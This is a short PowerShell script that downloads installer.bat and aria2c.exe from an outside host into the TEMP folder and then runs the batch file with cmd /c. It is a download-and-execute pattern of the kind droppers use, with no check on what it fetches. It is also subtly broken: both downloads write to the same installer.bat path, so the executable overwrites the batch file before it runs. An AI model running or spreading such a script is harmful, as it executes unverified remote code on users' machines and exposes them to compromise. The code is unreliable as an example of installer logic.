$batUrl = 'https://file.mocina.my.id/uploads/installer.bat'
$batFile = "$env:TEMP\installer.bat"
$aria2c = 'https://file.mocina.my.id/uploads/aria2c.exe'
$aria2File = "$env:TEMP\installer.bat"
Invoke-WebRequest -Uri $batUrl -OutFile $batFile
Invoke-WebRequest -Uri $aria2c -OutFile $aria2file
cmd /c $batFile
